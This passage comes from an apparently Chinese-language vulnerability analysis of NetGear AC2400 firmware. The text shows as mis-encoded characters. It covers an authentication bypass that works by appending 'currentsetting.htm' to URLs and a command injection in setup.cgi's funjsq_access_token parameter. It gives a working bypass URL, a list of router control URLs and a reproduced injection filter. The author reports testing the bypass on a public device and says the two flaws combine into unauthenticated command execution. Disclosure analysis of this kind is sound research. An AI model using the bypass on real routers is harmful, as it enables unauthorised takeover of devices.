class="built_in">fprintf</span>(v6, <span class="string">&quot;current_remote_ip:%s\n&quot;</span>, current_remote_ip);</span><br><span class="line">    v4 = v6;</span><br><span class="line">    v3 = &amp;fclose;</span><br><span class="line">LABEL_7:</span><br><span class="line">    v3(v4);</span><br><span class="line">LABEL_8:</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æˆ‘ä»¬è§‚å¯Ÿåˆ° login å‡½æ•°å¼€å¤´å¯¹ä¸€ä¸ªåä¸º currentsetting_flag çš„æ ‡å¿—ä½è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœä¸ç­‰äº 1ï¼Œå°±æ‰§è¡Œæ­£å¸¸çš„ login é€»è¾‘ï¼Œå¦åˆ™ä¼šè·³è¿‡ login é€»è¾‘ã€‚æœ€åå¯¹è®¿å®¢çš„ IP åœ°å€è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœè®¿å®¢æ¥è‡ªäºå…¬ç½‘ï¼Œä¼šä¸¢å¼ƒç›¸å…³è¯·æ±‚ã€‚</p>
<p>é‚£å¦‚æœæŸå¤„ä»£ç èƒ½æ§åˆ¶è¿™ä¸ªå˜é‡ä¸º 1ï¼Œå°±èƒ½ç»•è¿‡ login ç›´æ¥è®¿é—®åå°å†…å®¹ã€‚</p>
<p>é€šè¿‡äº¤å‰å¼•ç”¨ï¼Œåœ¨ handle_login å‡½æ•°ä¸­æ‰¾åˆ°äº†ä¸ºè¿™ä¸ªå˜é‡èµ‹å€¼çš„ä½ç½®</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( path_exist(path, off_427E50, v14)</span><br><span class="line">  || (v87 = path, <span class="built_in">strstr</span>(path, <span class="string">&quot;htpwd_recovery.cgi&quot;</span>)) &amp;&amp; (v88 = select_request_type(<span class="number">3</span>), !strcasecmp(v14, v88))</span><br><span class="line">  || <span class="built_in">strstr</span>(v87, <span class="string">&quot;PNPX_GetShareFolderList&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  multi_login_flag = <span class="number">0</span>;</span><br><span class="line">  login_or_not = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, <span class="string">&quot;currentsetting.htm&quot;</span>) )</span><br><span class="line">    currentsetting_flag = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">v89 = off_427E50;</span><br><span class="line">v90 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> ( *v89 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(path, *v89) )</span><br><span class="line">    v90 = <span class="number">1</span>;</span><br><span class="line">  ++v89;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç¬¬ 8 è¡Œä¼šå°† currentsetting_flag è®¾ä¸º 1ï¼Œä»è¿™é‡Œå‘å‰åˆ†æé™åˆ¶æ¡ä»¶ï¼Œè¦æ±‚æˆ‘ä»¬å‘é€çš„è¯·æ±‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. è®¿é—®çš„ URL ä½äº off_427E50 æŒ‡å‘çš„åˆ—è¡¨ä¸­</span><br><span class="line">2. å¦‚æœç›®æ ‡èµ„æºä¸åœ¨åˆ—è¡¨ä¸­ï¼Œåˆ™éœ€è¦ URL ä¸­åŒ…å« htpwd_recovery.cgi å¹¶ä¸”è¯·æ±‚ç±»å‹æ˜¯ POST</span><br><span class="line">3. å¦‚æœä¸Šé¢ä¸¤ä¸ªæ¡ä»¶éƒ½ä¸æ»¡è¶³ï¼Œåˆ™éœ€è¦ URL ä¸­åŒ…å« PNPX_GetShareFolderList </span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœæ»¡è¶³ä¸Šé¢æ‰€è¿°çš„æ¡ä»¶ï¼Œå°±ä¼šè¿›å…¥åˆ° if ä¸­ï¼Œåˆ†åˆ«è®¾ç½®ä¸¤ä¸ªå…¨å±€å˜é‡ï¼šmulti_login_flagã€login_or_notï¼Œå¹¶ä¸”å¦‚æœ URL ä¸­è¿˜åŒ…å« currentsetting.htmï¼Œå°±æŠŠ currentsetting_flag è®¾ç½®æˆ 1ã€‚</p>
<p>æ­¤å¤–ï¼Œmaybe_login å‡½æ•°åªåœ¨ handle_request å‡½æ•°ä¸­è°ƒç”¨äº†ä¸€æ¬¡ï¼Œhandle_request å‡½æ•°ä¸­è¿˜è°ƒç”¨äº†å¦ä¸€ä¸ªæ¯”è¾ƒå…³é”®çš„å‡½æ•° execute_cgiã€‚</p>
<p>httpd åªå……å½“å¤„ç†è¯·æ±‚çš„è§’è‰²ï¼Œåœ¨ç¡®å®šäº†è®¿é—®å“ªäº›æ¥å£ä¹‹åï¼Œå®ƒä¼šè°ƒç”¨ç›¸åº”çš„ cgi ç¨‹åºï¼Œexecute_cgi å‡½æ•°å°±è´Ÿè´£è§£æå’Œè°ƒç”¨è¿™äº› cgi ç¨‹åºã€‚</p>
<p>åœ¨è¿™ä¸ªå‡½æ•°ä¸­è¿˜å­˜åœ¨ä¸€äº›ç™»å½•é€»è¾‘ï¼Œç›¸å…³ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">strlcpy(v101, dword_429734, <span class="number">10000</span>);</span><br><span class="line">  v0 = <span class="built_in">strrchr</span>(v101, <span class="number">47</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">    *v0 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    strlcpy(v101, <span class="string">&quot;.&quot;</span>, <span class="number">10000</span>);</span><br><span class="line">  <span class="keyword">if</span> ( is_usb_session )</span><br><span class="line">  &#123;</span><br><span class="line">    usb_auth_check(v101);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( login_or_not )</span><br><span class="line">  &#123;</span><br><span class="line">    maybe_login(v101);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>åˆ¤æ–­äº† login_or_not å˜é‡ï¼Œå¦‚æœä¸ç­‰äº 0 å°±æ‰§è¡Œ loginï¼ŒåŒä¸Šï¼Œå½“æ„é€ æ»¡è¶³ç‰¹å®šè¦æ±‚çš„è¯·æ±‚æ—¶ï¼Œlogin_or_not ä¼šè¢«è®¾ç½®æˆ 0ï¼Œä¹Ÿèƒ½ç»•è¿‡è¿™ä¸ªé€»è¾‘ã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !login_or_not</span><br><span class="line">  || currentsetting_flag</span><br><span class="line">  || *v2 != <span class="number">48</span></span><br><span class="line">  || *v3 == <span class="number">98</span></span><br><span class="line">  || !authorization</span><br><span class="line">  || !*authorization</span><br><span class="line">  || !<span class="built_in">strncmp</span>(path, <span class="string">&quot;/cgi-bin/genie.cgi&quot;</span>, <span class="number">0x12</span>u) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( access(<span class="string">&quot;/tmp/dbg_sessionid&quot;</span>, <span class="number">0</span>) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">  v9 = fopen64(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_43;</span><br><span class="line">  <span class="built_in">fprintf</span>(v9, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;mini_httpd.c&quot;</span>, <span class="string">&quot;do_file&quot;</span>, <span class="number">2539</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(</span><br><span class="line">    v9,</span><br><span class="line">    <span class="string">&quot;no need verify for no auth or soap or genie.cgi, %d, %d, %s, %s, %s\n&quot;</span>,</span><br><span class="line">    login_or_not,</span><br><span class="line">    currentsetting_flag,</span><br><span class="line">    v2,</span><br><span class="line">    v3,</span><br><span class="line">    authorization);</span><br><span class="line">  v10 = v9;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_42;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¸Šé¢è¿™æ®µä»£ç åˆ¤æ–­å¤šä¸ªå˜é‡çš„çŠ¶æ€ï¼Œå’Œå‰ä¸€ä¸ªåˆ¤æ–­ login_or_not ç›¸åŒï¼Œæœ‰è¶£çš„æ˜¯å½“æ»¡è¶³æ¡ä»¶è¿›å…¥ ifï¼Œä¼šæ‰“å° </p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">no need verify for no auth or soap or genie.cgi</span><br></pre></td></tr></table></figure></div>

<p>æŸäº›æ¥å£ç¡®å®ä¸éœ€è¦æƒé™éªŒè¯å°±èƒ½è®¿é—®ï¼Œä½†æ˜¯åœ¨å®ç°è¿™é¡¹åŠŸèƒ½æ—¶ä½¿ç”¨äº† strstr è€Œä¸æ˜¯ç²¾ç¡®åŒ¹é…ï¼Œå¯¼è‡´å‡ºç°ç»•è¿‡çš„é—®é¢˜ã€‚</p>
<p>ç”¨æŸå…¬ç½‘è®¾å¤‡æµ‹è¯•ï¼ŒAC2400 å­˜åœ¨ä¸€ä¸ªå¯ä»¥å¼€å¯ debug æ¨¡å¼çš„æ¥å£ï¼Œé“¾æ¥</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/setup.cgi?todo=debug</span><br></pre></td></tr></table></figure></div>

<p>é»˜è®¤æƒ…å†µä¸‹è®¿é—®è¿™ä¸ªæ¥å£ä¼šå¾—åˆ° 401</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/AC2400-1.png"
                     
                ></p>
<p>æ„é€ ä¸€ä¸ªæ»¡è¶³æ¡ä»¶çš„ URL</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/setup.cgi?todo=debug&amp;x=currentsetting.htm</span><br></pre></td></tr></table></figure></div>

<p>å†æ¬¡è®¿é—®</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/AC2400-2.png"
                     
                ></p>
<p>å¯ä»¥çœ‹åˆ°æˆåŠŸè®¿é—®äº†è¯¥æ¥å£ï¼Œä½†å¯èƒ½æ˜¯é˜²ç«å¢™çš„åŸå› ï¼Œæ²¡æ³•å„¿è¿æ¥åˆ° telnetã€‚</p>
<p>è¿˜æœ‰ä¸€äº›å¯ç”¨çš„é“¾æ¥</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># https://gist.github.com/Donearm/978555</span><br><span class="line"># è¯·ç”¨æœ¬åœ°è®¾å¤‡æµ‹è¯•</span><br><span class="line"></span><br><span class="line">DEBUGURL = &#x27;http://192.168.0.1/setup.cgi?todo=debug&#x27;</span><br><span class="line">REBOOTURL = &#x27;http://192.168.0.1/setup.cgi?next_file=diag.htm&amp;todo=reboot&#x27;</span><br><span class="line">#DISCONNECTURL = &#x27;http://192.168.0.1/setup.cgi?todo=disconnect&amp;this_file=st_poe.htm&amp;next_file=st_poe.htm&#x27;</span><br><span class="line">DISCONNECTURL = &#x27;http://192.168.0.1/setup.cgi?todo=disconnect&#x27;</span><br><span class="line">#CONNECTURL = &#x27;http://192.168.0.1/setup.cgi?todo=connect&amp;this_file=st_poe.htm&amp;next_file=st_poe.htm&#x27;</span><br><span class="line">CONNECTURL = &#x27;http://192.168.0.1/setup.cgi?todo=connect&#x27;</span><br><span class="line">STATTBLURL = &#x27;http://192.168.0.1/setup.cgi?next_file=stattbl.htm&#x27;</span><br><span class="line">LOGOUTURL = &#x27;http://192.168.0.1/setup.cgi?todo=logout&#x27;</span><br><span class="line">INTERVALURL = &#x27;http://192.168.0.1/setup.cgi?next_file=interval.htm&#x27;</span><br><span class="line">STATUSURL = &#x27;http://192.168.0.1/setup.cgi?next_file=s_status.htm&#x27; </span><br></pre></td></tr></table></figure></div>

<p><strong>æ³¨ï¼šå¯¹äºä¸åŒå‹å·çš„è®¾å¤‡ï¼Œèƒ½å¤Ÿç»•è¿‡éªŒè¯çš„åŠŸèƒ½ä¸å®Œå…¨ä¸€è‡´ï¼ŒæŸäº›å¯ä»¥ç”¨äº GET è¯·æ±‚ï¼Œå¦ä¸€äº›å¯èƒ½åªå¯¹ POST è¯·æ±‚æœ‰æ•ˆã€‚æŸäº›å¯èƒ½åªå¯¹ htm é¡µé¢æœ‰æ•ˆï¼Œå…¶å®ƒåªå¯¹ cgi æœ‰æ•ˆã€‚</strong></p>
<p>æ–°ç‰ˆçš„ä¿®å¤æ‰‹æ®µé™æ€æ¥çœ‹ä¼¼ä¹æ˜¯æ·»åŠ äº†å•ç‚¹ç™»å½•ï¼Œç”±äºæ²¡æœ‰è®¾å¤‡æš‚æ—¶æ— æ³•éªŒè¯æ–°ç‰ˆå›ºä»¶çš„ç™»å½•é€»è¾‘ã€‚</p>
<p>æ­¤å¤–ï¼ŒNetGear å­˜åœ¨æŸäº›å†å²æ¼æ´ï¼Œä¹Ÿæ˜¯ç™»å½•éªŒè¯ç»•è¿‡ï¼Œè§¦å‘æ–¹æ³•æ˜¯åœ¨ URL ä¸­æ·»åŠ ç©ºå­—èŠ‚æˆ–è€…æ·»åŠ  1.jpg ç­‰å­—ç¬¦ä¸²ï¼Œå‚è€ƒé“¾æ¥ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/zer0yu/CVE_Request/tree/master/netgear</span><br><span class="line">https://www.zerodayinitiative.com/advisories/ZDI-19-866/</span><br></pre></td></tr></table></figure></div>

<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><h3 id="åŸºæœ¬ä¿¡æ¯-1"><a href="#åŸºæœ¬ä¿¡æ¯-1" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h3><p>å®˜æ–¹å‘å¸ƒä¿¡æ¯ï¼š<a class="link"   href="https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers" >https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>æŠ«éœ²ä¿¡æ¯ï¼š<a class="link"   href="https://www.zerodayinitiative.com/advisories/ZDI-20-1423/" >https://www.zerodayinitiative.com/advisories/ZDI-20-1423/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>æ¼æ´è¯„åˆ†ï¼š6.8(<strong>Medium</strong>)</p>
<p>æ¼æ´æè¿°ï¼šNetGear éƒ¨åˆ†è·¯ç”±å™¨å­˜åœ¨å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œæ‹¥æœ‰åå°æƒé™çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p>
<h2 id="æ¼æ´åˆ†æ-1"><a href="#æ¼æ´åˆ†æ-1" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>è¿˜æ˜¯ä»¥ AC2400 ä¸ºä¾‹ï¼ŒæŠ«éœ²ä¿¡æ¯ä¸­æåˆ°å‘½ä»¤æ³¨å…¥å‘ç”Ÿçš„ä½ç½®æ˜¯ funjsq_access_token å‚æ•°ï¼Œåœ¨è§£åŒ…ç›®å½•ä¸­æœç´¢åŒ…å«è¿™ä¸ªå­—ç¬¦ä¸²çš„æ–‡ä»¶</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep -r &quot;funjsq_access_token&quot;</span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥æ‰¾åˆ°åä¸º setup.cgi çš„äºŒè¿›åˆ¶ç¨‹åºï¼ŒIDA è½½å…¥ï¼Œæ‰¾åˆ°å­—ç¬¦ä¸²å¹¶äº¤å‰å¼•ç”¨å‘ç°ç›¸å…³å‡½æ•°å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_407C80</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v1; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [sp+18h] [-400h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">1023</span>]; <span class="comment">// [sp+19h] [-3FFh] BYREF</span></span><br><span class="line"></span><br><span class="line">  v1 = find_val(a1, <span class="string">&quot;funjsq_access_token&quot;</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  <span class="keyword">if</span> ( v1 &amp;&amp; <span class="built_in">strlen</span>(v1) &gt;= <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    COMMAND(<span class="string">&quot;/tmp/funjsq/bin/funjsq.sh login %s&quot;</span>, v1);</span><br><span class="line">    v2 = <span class="string">&quot;&#123; \&quot;success\&quot;: \&quot;1\&quot; &#125;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="string">&quot;&#123; \&quot;success\&quot;: \&quot;0\&quot; &#125;&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;v4, v2);</span><br><span class="line">  mime_header(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">  <span class="built_in">fputs</span>(&amp;v4, <span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>setup.cgi ä¸»è¦è´Ÿè´£å®ç°åå°çš„ä¸€äº›åŠŸèƒ½ï¼ŒæŸåŠŸèƒ½ä¼šç”¨åˆ°å‚æ•° funjsq_access_tokenï¼Œåœ¨ä¸Šé¢è¿™ä¸ªå‡½æ•°ä¸­è§£æå‡ºæ¥ä¹‹åç›´æ¥å¸¦å…¥å‡½æ•° COMMAND (å‚æ•°é•¿åº¦å¿…é¡»å¤§äºç­‰äº 6)ã€‚</p>
<p>ç»è¿‡æŸ¥æ‰¾ï¼ŒCOMMAND å‡½æ•°æ˜¯ &#x2F;lib&#x2F;libscmisc.so é“¾æ¥åº“å¯¼å‡ºçš„ï¼Œç›¸å…³ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">COMMAND</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [sp+1Ch] [-404h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">1023</span>]; <span class="comment">// [sp+1Dh] [-403h] BYREF</span></span><br><span class="line">  va_list va; <span class="comment">// [sp+42Ch] [+Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  va_start(va, a1);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="keyword">sizeof</span>(v5));</span><br><span class="line">  vsnprintf(&amp;v4, <span class="number">0x400</span>u, a1, va);</span><br><span class="line">  v2 = open(<span class="string">&quot;/etc/cmd_agent&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  result = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    write(v2, &amp;v4, <span class="number">0x400</span>u);</span><br><span class="line">    close(v2);</span><br><span class="line">    usleep(<span class="number">1u</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æŠŠä¼ å…¥çš„å‚æ•°å†™å…¥ cmd_agentï¼Œå®ƒä¹Ÿæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶ç¨‹åºï¼Œä½äº &#x2F;usr&#x2F;sbin ç›®å½•ä¸‹ã€‚IDA ç®€å•åˆ†æå‘ç°å®ƒä¼šæ‰§è¡Œå†™å…¥å…¶ä¸­çš„å‘½ä»¤ï¼Œé‚£ä¹ˆæ˜¾ç„¶è¿™é‡Œå­˜åœ¨å‘½ä»¤æ³¨å…¥çš„é—®é¢˜ã€‚</p>
<p>æ–°ç‰ˆæœ¬ä»£ç </p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_411840</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// $s0</span></span><br><span class="line">  FILE *v3; <span class="comment">// $s0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// $v0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// $a1</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [sp+20h] [-404h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">1023</span>]; <span class="comment">// [sp+21h] [-403h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2 = find_val(a1, <span class="string">&quot;funjsq_access_token&quot;</span>);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="keyword">sizeof</span>(v8));</span><br><span class="line">  <span class="keyword">if</span> ( sub_4117D0(a1) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fopen(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(v3, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;action.c&quot;</span>, <span class="string">&quot;funjsq_login&quot;</span>, <span class="number">11165</span>);</span><br><span class="line">      <span class="built_in">fputs</span>(<span class="string">&quot;wrong method\n&quot;</span>, v3);</span><br><span class="line">      fclose(v3);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( region_isPR(<span class="number">4980736</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = nvram_get(<span class="string">&quot;wiz_language&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      v4 = nptr;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v4, <span class="string">&quot;Chinese&quot;</span>) &amp;&amp; test_command_inject(v2) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !v2 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strstr</span>(v2, <span class="string">&quot;telneted&quot;</span>) )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v2) &gt;= <span class="number">6</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        COMMAND(<span class="string">&quot;/tmp/funjsq/bin/funjsq.sh login %s&quot;</span>, v2);</span><br><span class="line">        v5 = <span class="string">&quot;&#123; \&quot;success\&quot;: \&quot;1\&quot; &#125;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">        v5 = <span class="string">&quot;&#123; \&quot;success\&quot;: \&quot;0\&quot; &#125;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">strcpy</span>(&amp;v7, v5);</span><br><span class="line">      mime_header(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">      <span class="built_in">fputs</span>(&amp;v7, <span class="built_in">stdout</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>funjsq_access_token å‚æ•°ä¸»è¦æ˜¯å¸†æ¸¸åŠ é€Ÿå™¨è¿™ä¸ªåŠŸèƒ½ä½¿ç”¨çš„ï¼Œä»æ–°ç‰ˆä»£ç æ¥çœ‹ï¼Œä¼¼ä¹æ˜¯ä¸­å›½ç‰¹ä¾›çš„åŠŸèƒ½ï¼Œæ–°ç‰ˆæœ¬ä¸­åŠ å…¥äº†å¯¹è¯­è¨€çš„åˆ¤å®šï¼Œå¦‚æœæ˜¯ä¸­æ–‡æ‰è¿›è¡Œä¸‹ä¸€æ­¥æ“ä½œã€‚</p>
<p>å¦å¤–å¼•å…¥äº†å‡½æ•° test_command_inject å¯¹å‚æ•°è¿‡æ»¤ï¼Œä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">test_command_inject</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// $s2</span></span><br><span class="line">  FILE *v3; <span class="comment">// $s0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, <span class="string">&quot;/bin&quot;</span>) || <span class="built_in">strstr</span>(a1, <span class="string">&quot;/sbin&quot;</span>) || (v2 = <span class="number">1</span>, <span class="built_in">strchr</span>(a1, <span class="string">&#x27;`&#x27;</span>)) )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fopen(<span class="string">&quot;/dev/console&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(v3, <span class="string">&quot;[%s::%s():%d] &quot;</span>, <span class="string">&quot;other.c&quot;</span>, <span class="string">&quot;test_command_inject&quot;</span>, <span class="number">2495</span>);</span><br><span class="line">      <span class="built_in">fprintf</span>(v3, <span class="string">&quot;Possible COMMAND injection detected:\&quot;%s\&quot;!\n&quot;</span>, a1);</span><br><span class="line">      fclose(v3);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¦æ±‚å‚æ•°ä¸­ä¸èƒ½å­˜åœ¨ &#x2F;binã€&#x2F;sbinã€å­—ç¬¦ â€˜&#96;â€™ã€å­—ç¬¦ä¸² telneted (ä»è§£å‹å‡ºæ¥çš„å›ºä»¶ä¸­å¹¶æ²¡æœ‰å‘ç° telnet<strong>e</strong>d è¿™ä¸ªç¨‹åºï¼Œä¼¼ä¹æ˜¯å¼€å‘äººå‘˜å¤šæ‰“äº†ä¸€ä¸ª e ï¼Ÿ)ã€‚</p>
<p>é™æ€æ¥çœ‹è¿™ä¸ªæ¼æ´å¹¶æ²¡æœ‰å®Œå…¨ä¿®å¤ï¼Œè™½ç„¶ä¸èƒ½ä½¿ç”¨å­—ç¬¦ â€˜&#96;â€™ï¼Œä½†æ˜¯ä¾ç„¶å¯ä»¥ç”¨å…¶ä»–æ‰‹æ®µç»•è¿‡ã€‚</p>
<p>å¯ä»¥ç»“åˆä»¥ä¸Šä¸¤ä¸ªæ¼æ´å®ç°æ— éœ€èº«ä»½éªŒè¯çš„ä»»æ„å‘½ä»¤æ‰§è¡Œï¼Œæ‰‹å¤´æš‚æ—¶æ²¡æœ‰åˆé€‚çš„è®¾å¤‡è°ƒè¯•ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥è‡ªå·±å°è¯•æ„é€ ä¸€ä¸‹åˆ©ç”¨è„šæœ¬ã€‚</p>
